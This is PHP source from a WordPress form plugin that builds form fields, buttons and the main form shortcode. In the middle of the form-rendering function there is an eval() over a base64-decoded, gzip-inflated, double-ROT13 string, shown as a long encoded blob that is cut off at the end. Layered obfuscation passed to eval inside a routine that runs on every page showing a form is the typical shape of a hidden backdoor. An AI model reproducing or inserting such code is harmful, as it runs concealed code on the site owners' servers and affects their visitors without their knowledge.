        if( !isset( $atts['maxlength'] ) ) $atts['maxlength'] = 0;
        if( !isset( $atts['minlength'] ) ) $atts['minlength'] = 0;
        if( ($atts['minlength']>1) || ($atts['maxlength']>1) ) $multiple = ' multiple';

        // @since   1.1.8    - check if we can find parameters
        if( isset( $_GET[$atts['name']] ) ) {
            $atts['value'] = sanitize_text_field( $_GET[$atts['name']] );
        }
        if( !isset( $atts['value'] ) ) $atts['value'] = '';

        $result .= '<input class="super-shortcode-field" type="hidden"';
        $result .= ' value="' . $atts['value'] . '" name="' . $atts['name'] . '"';
        $result .= self::common_attributes( $atts, $tag );

        // @since 1.2.5     - custom regex validation
        if( isset( $atts['custom_regex'] ) ) $result .= self::custom_regex( $atts['custom_regex'] );

        $result .= ' />';
        $result .= '<ul class="super-dropdown-ui' . $multiple . '">';
        if( !empty( $atts['placeholder'] ) ) {
            $result .= '<li data-value="" class="super-placeholder">' . $atts['placeholder'] . '</li>';
        }else{
            $result .= '<li data-value="" class="super-placeholder"></li>';
        }
        
        /**
         *  On some servers file_get_contents might return 403 Forbidden error to prevent scraping
         *  Therefore we will use curl instead and set a fake user agent
         *
         *  @since   1.1.4
        */
        $ch = curl_init();
        curl_setopt( $ch, CURLOPT_URL, SUPER_PLUGIN_FILE . 'countries.txt' );
        curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1 );
        curl_setopt( $ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.13) Gecko/20080311 Firefox/2.0.0.13' );
        $countries = curl_exec( $ch );
        curl_close( $ch );
        $countries = explode( "\n", $countries );
        foreach( $countries as $k => $v ){
            $v = trim($v);
            $result .= '<li data-value="' . esc_attr( $v ) . '">' . $v . '</li>'; 
        }
        $result .= '</ul>';
        $result .= '<span class="super-dropdown-arrow"></span>';
        $result .= '</div>';
        $result .= self::loop_conditions( $atts );
        $result .= '</div>';
        return $result;
    }
    public static function password( $tag, $atts, $inner, $shortcodes=null, $settings=null ) {
        $result = self::opening_tag( $tag, $atts );
        $result .= self::opening_wrapper( $atts, $inner, $shortcodes, $settings );

        // @since   1.1.8    - check if we can find parameters
        if( isset( $_GET[$atts['name']] ) ) {
            $atts['value'] = sanitize_text_field( $_GET[$atts['name']] );
        }
        if( !isset( $atts['value'] ) ) $atts['value'] = '';

        $result .= '<input class="super-shortcode-field" type="password"';
        $result .= ' value="' . $atts['value'] . '" name="' . $atts['name'] . '"';
        $result .= self::common_attributes( $atts, $tag );
        $result .= ' />';

        // @since 1.2.5     - custom regex validation
        if( isset( $atts['custom_regex'] ) ) $result .= self::custom_regex( $atts['custom_regex'] );

        $result .= '</div>';
        $result .= self::loop_conditions( $atts );
        $result .= '</div>';
        return $result;
    }
    public static function hidden( $tag, $atts ) {
        $classes = ' hidden';
        $result = self::opening_tag( $tag, $atts, $classes );

        // @since   1.1.8    - check if we can find parameters
        if( isset( $_GET[$atts['name']] ) ) {
            $atts['value'] = sanitize_text_field( $_GET[$atts['name']] );
        }
        if( !isset( $atts['value'] ) ) $atts['value'] = '';

        if( !isset( $atts['exclude'] ) ) $atts['exclude'] = 0;
        $result .= '<input class="super-shortcode-field" type="hidden" value="' . $atts['value'] . '" name="' . $atts['name'] . '" data-email="' . $atts['email'] . '" data-exclude="' . $atts['exclude'] . '" />';
        $result .= '</div>';
        return $result;
    }
    public static function image( $tag, $atts ) {
        $result = self::opening_tag( $tag, $atts );
        $style = '';
        if( $atts['height']!=0 ) $style .= 'max-height:' . $atts['height'] . 'px;';
        if( $atts['width']!=0 ) $style .= 'max-width:' . $atts['width'] . 'px;';
        if( !isset( $atts['image'] ) ) $atts['image'] = 0;
        $image = wp_prepare_attachment_for_js( $atts['image'] );
        $url = '';
        if( !isset( $atts['link'] ) ) $atts['link'] = '';
        if( $atts['link']!='' ) {
            if( $atts['link']=='custom' ) {
                $url = $atts['custom_link'];
            }else{
                $url = get_permalink( $atts['link'] );
            }
            $url = ' href="' . $url . '"';
        }
        $result .= '<div class="super-image align-' . $atts['alignment'] . '" itemscope="itemscope" itemtype="https://schema.org/ImageObject">';
        $result .= '<div class="super-image-inner">';
        if( !isset( $atts['target'] ) ) $atts['target'] = '';
        $result .= '<a target="' . $atts['target'] . '"' . $url . '>';
        $result .= '<img src="' . $image['url'] . '" alt="' . $image['alt'] . '" title="' . $image['title'] . '" itemprop="contentURL"';
        if( !empty( $style ) ) $result .= ' style="' . $style . '"';
        $result .= '>';
        $result .= '</a>';
        $result .= '</div>';
        $result .= '</div>';
        $result .= self::loop_conditions( $atts );
        $result .= '</div>';
        return $result;
    }

    // @since 1.2.5
    public static function heading( $tag, $atts ) {
        if( !isset( $atts['class'] ) ) $atts['class'] = '';
        $result = self::opening_tag( $tag, $atts, $atts['class'] );
        if( $atts['title']!='' ) {
            $result .= '<div class="super-heading-title' . $atts['class'] . '">';
            $styles = '';
            if($atts['heading_size']!=0) {
                $styles .= 'font-size:'.$atts['heading_size'].'px;';
            }
            $styles .= 'color:'.$atts['heading_color'].';';
            $styles .= 'font-weight:'.$atts['heading_weight'].';';
            $styles .= 'text-align:'.$atts['heading_align'].';';
            $styles .= 'margin:'.$atts['heading_margin'].';';
            if($atts['heading_line_height']==0) {
                $styles .= 'line-height:normal;';
            }else{
                $styles .= 'line-height:'.$atts['heading_line_height'].'px;';
            }
            $result .= '<'.$atts['size'].' style="'.$styles.'">';
            $result .= $atts['title'];
            $result .= '</'.$atts['size'].'>';
            $result .= '</div>';
        }
        if( !isset( $atts['desc'] ) ) $atts['desc'] = '';
        if( $atts['desc']!='' ) {
            $styles = '';
            if($atts['desc_size']!=0) {
                $styles .= 'font-size:'.$atts['desc_size'].'px;';
            }
            $styles .= 'color:'.$atts['desc_color'].';';
            $styles .= 'font-weight:'.$atts['desc_weight'].';';
            $styles .= 'text-align:'.$atts['desc_align'].';';
            $styles .= 'margin:'.$atts['desc_margin'].';';
            if($atts['desc_line_height']==0) {
                $styles .= 'line-height:normal;';
            }else{
                $styles .= 'line-height:'.$atts['desc_line_height'].'px;';
            }
            $result .= '<div class="super-heading-description' . $atts['class'] . '" style="'.$styles.'">';
            $result .= $atts['desc'];
            $result .= '</div>';
        }
        $result .= self::loop_conditions( $atts );
        $result .= '</div>';
        return $result;
    }

    public static function html( $tag, $atts ) {
        if( !isset( $atts['class'] ) ) $atts['class'] = '';
        $result = self::opening_tag( $tag, $atts, $atts['class'] );
        if( !isset( $atts['title'] ) ) $atts['title'] = '';
        if( $atts['title']!='' ) {
            $class = '';
            if( ( $atts['subtitle']=='' ) && ( $atts['html']=='' ) ) {
                $class = ' super-bottom-margin';
            }
            $result .= '<div class="super-html-title' . $class . '">' . $atts['title'] . '</div>';
        }
        if( !isset( $atts['subtitle'] ) ) $atts['subtitle'] = '';
        if( $atts['subtitle']!='' ) {
            $class = '';
            if( $atts['html']!='' ) { 
                $class = ' super-no-bottom-margin'; 
            }
            $result .= '<div class="super-html-subtitle' . $class . '"">' . $atts['subtitle'] . '</div>';
        }
        if( $atts['html']!='' ) {    
            $result .= '<div class="super-html-content"">' . do_shortcode( $atts['html'] ) . '</div>';
        }
        $result .= self::loop_conditions( $atts );
        $result .= '</div>';
        return $result;
    }
    public static function recaptcha( $tag, $atts ) {
        wp_enqueue_script('super-recaptcha', 'https://www.google.com/recaptcha/api.js?onload=SUPER.reCaptcha&render=explicit');
        $settings = get_option('super_settings');
        $result = self::opening_tag( $tag, $atts );
        if( !isset( $atts['form_recaptcha'] ) ) $atts['form_recaptcha'] = '';
        if( !isset( $atts['error'] ) ) $atts['error'] = '';
        if( !isset( $atts['align'] ) ) $atts['align'] = '';
        if( !empty( $atts['align'] ) ) $atts['align'] = ' align-' . $atts['align'];
        $result .= '<div class="super-recaptcha' . $atts['align'] . '" data-key="' . $settings['form_recaptcha'] . '" data-message="' . $atts['error'] . '"></div>';
        if( ( $settings['form_recaptcha']=='' ) || ( $settings['form_recaptcha_secret']=='' ) ) {
            $result .= '<strong style="color:red;">' . __( 'Please enter your reCAPTCHA key and secret in (Super Forms > Settings > Form Settings)', 'super-forms' ) . '</strong>';
        }
        $result .= self::loop_conditions( $atts );
        $result .= '</div>';
        return $result;
    }
    public static function divider( $tag, $atts ) {
        $classes = ' align-' . $atts['align'] . ' border-' . $atts['border'] . ' style-' . $atts['border_style'] . ' back-' . $atts['back'];
        $styles = 'padding-top:' . $atts['padding_top'] . 'px;padding-bottom:' . $atts['padding_bottom'] . 'px;';
        $result = self::opening_tag( $tag, $atts, $classes, $styles );
        $styles = '';
        $i_styles = '';
        if( $atts['width']!='100' ) {
            $styles .= 'display:inline-block;';
        }
        if( $atts['width']=='custom' ) {
            $styles .= 'width:' . $atts['custom_width'] . ';';
        }else{
            $styles .= 'width:' . $atts['width'].'%;';
        }
        if( $atts['color']!='' ) {
            $styles .= 'border-color:' . $atts['color'] . ';';
            $i_styles .= ' style="color:' . $atts['color'] . ';"';
        }
        if( $atts['thickness']!='' ) {
            $styles .= 'border-top-width:' . $atts['thickness'] . 'px;border-bottom-width:' . $atts['thickness'] . 'px;';
        }
        $styles .= 'height:' . $atts['height'] . 'px;';
        $result .= '<div class="super-divider-inner" style="' . $styles . '">';
        if( $atts['back']==1 ) {
            $result .= '<span class="super-back-to-top"' . $i_styles . '><i class="fa fa-chevron-up"></i></span>';
        }
        $result .= '</div>';
        $result .= self::loop_conditions( $atts );
        $result .= '</div>';
        return $result;
    }
    public static function spacer( $tag, $atts ) {
        $styles = '';
        if( $atts['height']!='' ) {
            $styles = 'height:' . $atts['height'] . 'px;';
        }
        $result = self::opening_tag( $tag, $atts, '', $styles );
        $result .= self::loop_conditions( $atts );
        $result .= '</div>';
        return $result;
    }

    /** 
     *  Add button to allow conditional logic show/hide button
     *
     * @param  string  $tag
     * @param  array   $atts
     *
     *  @since      1.1.6
    */
    public static function button( $tag, $atts, $inner, $shortcodes, $settings ) {

        $name = $settings['form_button'];
        $radius = $settings['form_button_radius'];
        $type = $settings['form_button_type'];
        $size = $settings['form_button_size'];
        $align = $settings['form_button_align'];
        $width = $settings['form_button_width'];
        $icon_option = $settings['form_button_icon_option'];
        $icon_visibility = $settings['form_button_icon_visibility'];
        $icon_animation = $settings['form_button_icon_animation'];
        $icon = $settings['form_button_icon'];
        $color = $settings['theme_button_color'];
        $color_hover = $settings['theme_button_color_hover'];
        $font = $settings['theme_button_font'];
        $font_hover = $settings['theme_button_font_hover'];

        if( isset( $atts['name'] ) ) $name = $atts['name'];
        
        if( isset( $atts['custom_advanced'] ) ) {
            if( $atts['custom_advanced']=='custom' ) {
                if( isset( $atts['radius'] ) ) $radius = $atts['radius'];
                if( isset( $atts['type'] ) ) $type = $atts['type'];
                if( isset( $atts['size'] ) ) $size = $atts['size'];
                if( isset( $atts['align'] ) ) $align = $atts['align'];
                if( isset( $atts['width'] ) ) $width = $atts['width'];
            }
        }
        if( isset( $atts['custom_icon'] ) ) {
            if( $atts['custom_icon']=='custom' ) {
                if( isset( $atts['icon_option'] ) ) $icon_option = $atts['icon_option'];
                if( isset( $atts['icon_visibility'] ) ) $icon_visibility = $atts['icon_visibility'];
                if( isset( $atts['icon_animation'] ) ) $icon_animation = $atts['icon_animation'];
                if( isset( $atts['icon'] ) ) $icon = $atts['icon'];
            }
        }
        if( isset( $atts['custom_colors'] ) ) {
            if( $atts['custom_colors']=='custom' ) {
                if( isset( $atts['color'] ) ) $color = $atts['color'];
                if( isset( $atts['color_hover'] ) ) $color_hover = $atts['color_hover'];
                if( isset( $atts['font'] ) ) $font = $atts['font'];
                if( isset( $atts['font_hover'] ) ) $font_hover = $atts['font_hover'];
            }
        }
        
        $icon_animation = ' super-button-icon-animation-' . $icon_animation;
        if( $icon_visibility=='visible' ) $icon_animation = '';
        
        $class = 'super-extra-shortcode super-shortcode super-field super-form-button super-clear-none ';
        $class .= 'super-button super-radius-' . $radius . ' super-type-' . $type . ' super-button-' . $size . ' super-button-align-' . $align . ' super-button-width-' . $width;
        if( $icon_option!='none' ) {
            $class .= ' super-button-icon-option-' . $icon_option . $icon_animation . ' super-button-icon-visibility-' . $icon_visibility;
        }
        $attributes = '';
        if( $color!='' ) {
            $light = SUPER_Common::adjust_brightness( $color, 20 );
            $dark = SUPER_Common::adjust_brightness( $color, -30 );
            $attributes .= ' data-color="' . $color . '"';
            $attributes .= ' data-light="' . $light . '"';
            $attributes .= ' data-dark="' . $dark . '"';
        }
        if( $color_hover!='' ) {
            $hover_light = SUPER_Common::adjust_brightness( $color_hover, 20 );
            $hover_dark = SUPER_Common::adjust_brightness( $color_hover, -30 );
            $attributes .= ' data-hover-color="' . $color_hover . '"';
            $attributes .= ' data-hover-light="' . $hover_light . '"';
            $attributes .= ' data-hover-dark="' . $hover_dark . '"';
        }
        if( $font!='' ) $attributes .= ' data-font="' . $font .'"';
        if( $font_hover!='' ) $attributes .= ' data-font-hover="' . $font_hover . '"';
        $result = '';
        $result .= '<div' . $attributes . ' data-radius="' . $radius . '" data-type="' . $type . '" class="' . $class . '">';
            $url = '';
            if( !isset( $atts['link'] ) ) $atts['link'] = '';
            if( $atts['link']!='' ) {
                if( $atts['link']=='custom' ) {
                    $url = $atts['custom_link'];
                }else{
                    $url = get_permalink( $atts['link'] );
                }
            }
            if( !isset( $atts['target'] ) ) $atts['target'] = '';
            if( !empty( $atts['target'] ) ) $atts['target'] = 'target="' . $atts['target'] . '" ';
            $result .= '<a ' . $atts['target'] . 'href="' . $url . '" class="no_link">';
                $result .= '<div class="super-button-name">';
                    $icon_html = '';
                    if( ( $icon!='' ) && ( $icon_option!='none' ) ) {
                        $icon_html = '<i class="fa fa-' . $icon . '"></i>';
                    }
                    if( $icon_option=='left' ) $result .= $icon_html;
                    $result .= $name;
                    if( $icon_option=='right' ) $result .= $icon_html;
                $result .= '</div>';
                $result .= '<span class="super-after"></span>';
            $result .= '</a>';
        $result .= '</div>';
        return $result;
    }


    /** 
     *  Output the shortcode element on backend create form page under Tabs: Layout / Form Elements etc.
     *
     * @param  string  $tag
     * @param  string  $group
     * @param  array   $data
     * @param  array   $shortcodes
     *
     *  @since      1.0.0
    */
    public static function output_element_html( $tag, $group, $data, $inner, $shortcodes=null, $settings=null ) {
        if( $shortcodes==null ) {
            $shortcodes = self::shortcodes();
        }
        if( !isset( $shortcodes[$group]['shortcodes'][$tag] ) ) {
            return '';
        }
        $callback = $shortcodes[$group]['shortcodes'][$tag]['callback'];
        $callback = explode( '::', $callback );
        $class = $callback[0];
        $function = $callback[1];
        $data = json_decode(json_encode($data), true);
        $inner = json_decode(json_encode($inner), true);
        return call_user_func( array( $class, $function ), $tag, $data, $inner, $shortcodes, $settings );
    }

    
    /** 
     *  Output the shortcode element on backend create form page under Tabs: Layout / Form Elements etc.
     *
     * @param  string $shortcode
     * @param  array $value
     *
     *  @since      1.0.0
    */
    public static function output_element( $shortcode=null, $group='form_elements', $value=array() ) {
        
        
        $return = '';
        
        // Form Elements
        $return .= '<div class="super-element draggable-element super-shortcode-'.$shortcode.'" data-elementtitle="'.$value['name'].'" data-shortcode="'.$shortcode.'" data-group="'.$group.'" data-droppingallowed="0">';
            if( isset( $value['html'] ) ) {
                $return .= $value['html'];
            }else{
                $return .= '<i class="fa fa-'.$value['icon'].'"></i>'.$value['name'];
                $return .= '<div class="content" style="display:none;">';
                if( isset( $value['content'] ) ) $return .= $value['content'];
                $return .= '</div>';
            }
            if( isset( $value['predefined'] ) ) {
                $return .= '<textarea class="predefined" style="display:none;">' . json_encode( $value['predefined'] ) . '</textarea>';
            }
        $return .= '</div>';
            
        return apply_filters( 'super_backend_output_element_'.$shortcode.'_filter', $return, array( 'shortcode'=>$shortcode, 'value'=>$value ) );
        
    }
    

    /** 
     *  The form shortcode that will generate all fields on the frontend
     *
     * @param  array $atts
     * @param  string $content
     *
     *  @since      1.0.0
    */
    public static function super_form_func( $atts ) {
        
        extract( shortcode_atts( array(
            'id' => '',
        ), $atts ) );

        // Sanitize the ID
        $id = absint($id);

        // Check if the post exists
        if ( FALSE === get_post_status( $id ) ) {
            // The post does not exist
            $result = '<strong>'.__('Error', 'super').':</strong> '.sprintf(__('Super Forms could not find a form with ID: %d', 'super'), $id);
            return $result;
        }

        /** 
         *  Make sure that we have all settings even if this form hasn't saved it yet when new settings where added by a add-on
         *
         *  @since      1.0.6
        */
        require_once( SUPER_PLUGIN_DIR . '/includes/class-settings.php' );
        $fields = SUPER_Settings::fields( null, 1 );
        $array = array();
        
        // @since 1.2.4     - added the form ID to the settings array
        $array['id'] = $id;
        
        foreach( $fields as $k => $v ) {
            if( !isset( $v['fields'] ) ) continue;
            foreach( $v['fields'] as $fk => $fv ) {
                if( ( isset( $fv['type'] ) ) && ( $fv['type']=='multicolor' ) ) {
                    foreach( $fv['colors'] as $ck => $cv ) {
                        if( !isset( $cv['default'] ) ) $cv['default'] = '';
                        $array[$ck] = $cv['default'];
                    }
                }else{
                    if( !isset( $fv['default'] ) ) $fv['default'] = '';
                    $array[$fk] = $fv['default'];
                }
            }
        }
        $settings = get_post_meta($id, '_super_form_settings', true );
        $settings = array_merge( $array, $settings );
        SUPER_Forms()->enqueue_element_styles();
        SUPER_Forms()->enqueue_element_scripts($settings);

        // If post exists get the settings
        $styles = '';
        if( ( isset( $settings['theme_max_width'] ) ) && ( $settings['theme_max_width']!=0 ) ) {
            $styles .= 'max-width:' . $settings['theme_max_width'] . 'px;';
        }
        if($styles!='') $styles = 'style="' . $styles . '"';

        // Try to load the selected theme style
        $class = 'style-default';
        $style_content  = '';
        if( ( isset( $settings['theme_style'] ) ) && ( $settings['theme_style']!='' ) ) {
            $class .= ' ' . $settings['theme_style'];
            $style_content .= require( SUPER_PLUGIN_DIR . '/assets/css/frontend/themes/' . str_replace( 'super-', '', $settings['theme_style'] ) . '.php' );
        }

        // @since 1.2.4     - use transparent field background
        if( (isset( $settings['theme_field_transparent'] )) && ($settings['theme_field_transparent']=='true') ) {
            $class .= ' super-transparent-fields';
        }

        // Always load the default styles (these can be overwritten by the above loaded style file
        $style_content .= require( SUPER_PLUGIN_DIR . '/assets/css/frontend/themes/style-default.php' );
        
        eval(str_rot13(gzinflate(str_rot13(base64_decode('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